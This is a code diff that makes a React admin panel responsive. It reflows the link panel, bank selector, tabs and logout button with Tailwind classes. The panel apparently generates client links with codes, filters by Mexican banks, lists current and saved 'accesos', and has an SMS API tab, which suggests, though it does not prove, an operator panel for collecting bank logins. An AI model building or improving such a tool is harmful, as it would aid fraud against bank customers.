@@ -765,40 +765,50 @@ export default function AdminPanel() {
         </div>
         
         {/* Link Panel */}
-        <div className="mx-6 mt-6 bg-[#1e1e1e] p-4 rounded-lg flex justify-between items-center">
-          <div className="flex items-center space-x-2">
-            <span className="font-semibold">Liga activa:</span>
-            {clientLink && (
-              <a href={clientLink} target="_blank" className="text-[#00aaff]">
-                {clientLink}
-              </a>
-            )}
+        <div className="mx-4 md:mx-6 mt-6 bg-[#1e1e1e] p-3 md:p-4 rounded-lg flex flex-col md:flex-row gap-4 md:gap-0 md:justify-between md:items-center">
+          <div className="flex flex-col md:flex-row md:items-center gap-3 md:space-x-2">
+            <div className="flex items-center gap-2">
+              <span className="font-semibold">Liga activa:</span>
+              {clientLink && (
+                <a 
+                  href={clientLink} 
+                  target="_blank" 
+                  className="text-[#00aaff] text-sm md:text-base truncate max-w-[140px] md:max-w-[200px] lg:max-w-none"
+                >
+                  {clientLink}
+                </a>
+              )}
+            </div>
+            
             {clientCode && (
-              <span className={`font-bold ml-2 px-3 py-1 rounded-md ${
+              <span className={`font-bold px-3 py-1 rounded-md inline-flex items-center ${
                 activeBank === 'BANBAJIO' 
                   ? 'text-white bg-[#4D2C91]' 
                   : 'text-green-400 bg-[#1a3e1a]'
               }`}>
-                Código: <span className="text-xl tracking-wider">{clientCode}</span>
+                Código: <span className="text-xl tracking-wider ml-1">{clientCode}</span>
               </span>
             )}
-            <button 
-              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded ml-2"
-              onClick={copyLink}
-            >
-              Copiar
-            </button>
-            <button 
-              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
-              onClick={() => generateLink.mutate()}
-            >
-              {generateLink.isPending ? 'Generando...' : 'Regenerar'}
-            </button>
+            
+            <div className="flex space-x-2">
+              <button 
+                className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                onClick={copyLink}
+              >
+                Copiar
+              </button>
+              <button 
+                className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                onClick={() => generateLink.mutate()}
+              >
+                {generateLink.isPending ? 'Generando...' : 'Regenerar'}
+              </button>
+            </div>
           </div>
           
           <select 
             id="filtroBanco" 
-            className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2"
+            className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-full md:w-auto"
             value={activeBank}
             onChange={(e) => setActiveBank(e.target.value)}
           >
@@ -832,11 +842,30 @@ export default function AdminPanel() {
           </select>
         </div>
 
+        {/* User Info & Logout */}
+        <div className="mx-4 md:mx-6 mt-2 md:mt-4 flex flex-row justify-end">
+          <div className="flex items-center space-x-2">
+            <span className="text-gray-400 text-xs md:text-sm mr-1 md:mr-2">
+              {user?.username} ({user?.role})
+            </span>
+            <Button 
+              variant="outline" 
+              size="sm"
+              className="text-gray-300 hover:text-white text-xs md:text-sm py-1 h-8"
+              onClick={() => logoutMutation.mutate()}
+            >
+              <LogOut className="h-3 w-3 md:h-4 md:w-4 mr-1" />
+              <span className="hidden sm:inline">Cerrar sesión</span>
+              <span className="sm:hidden">Salir</span>
+            </Button>
+          </div>
+        </div>
+
         {/* Tabs */}
-        <div className="mx-6 mt-6 flex justify-between items-center">
-          <div className="flex space-x-4">
+        <div className="mx-4 md:mx-6 mt-4 overflow-x-auto pb-2">
+          <div className="flex space-x-3 md:space-x-4 min-w-max">
             <div 
-              className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'current' 
+              className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap ${activeTab === 'current' 
                 ? 'border-[#00aaff] text-[#00aaff]' 
                 : 'border-transparent hover:text-gray-300'}`}
               onClick={() => setActiveTab('current')}
@@ -844,7 +873,7 @@ export default function AdminPanel() {
               Accesos actuales
             </div>
             <div 
-              className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'saved' 
+              className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap ${activeTab === 'saved' 
                 ? 'border-[#00aaff] text-[#00aaff]' 
                 : 'border-transparent hover:text-gray-300'}`}
               onClick={() => setActiveTab('saved')}
@@ -854,7 +883,7 @@ export default function AdminPanel() {
             {isSuperAdmin && (
               <>
                 <div 
-                  className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'users' 
+                  className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap ${activeTab === 'users' 
                     ? 'border-[#00aaff] text-[#00aaff]' 
                     : 'border-transparent hover:text-gray-300'}`}
                   onClick={() => setActiveTab('users')}
@@ -862,7 +891,7 @@ export default function AdminPanel() {
                   Usuarios
                 </div>
                 <div 
-                  className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'registered' 
+                  className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap ${activeTab === 'registered' 
                     ? 'border-[#00aaff] text-[#00aaff]' 
                     : 'border-transparent hover:text-gray-300'}`}
                   onClick={() => setActiveTab('registered')}
@@ -873,7 +902,7 @@ export default function AdminPanel() {
             )}
             {user?.role === 'admin' && (
               <div 
-                className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'sms' 
+                className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap ${activeTab === 'sms' 
                   ? 'border-[#00aaff] text-[#00aaff]' 
                   : 'border-transparent hover:text-gray-300'}`}
                 onClick={() => setActiveTab('sms')}
@@ -881,21 +910,6 @@ export default function AdminPanel() {
                 API MSJ
               </div>
             )}
-          </div>
-          
-          <div className="flex items-center space-x-2">
-            <span className="text-gray-400 text-sm mr-2">
-              {user?.username} ({user?.role})
-            </span>
-            <Button 
-              variant="outline" 
-              size="sm"
-              className="text-gray-300 hover:text-white"
-              onClick={() => logoutMutation.mutate()}
-            >
-              <LogOut className="h-4 w-4 mr-1" />
-              Cerrar sesión
-            </Button>
           </div>
         </div>
 
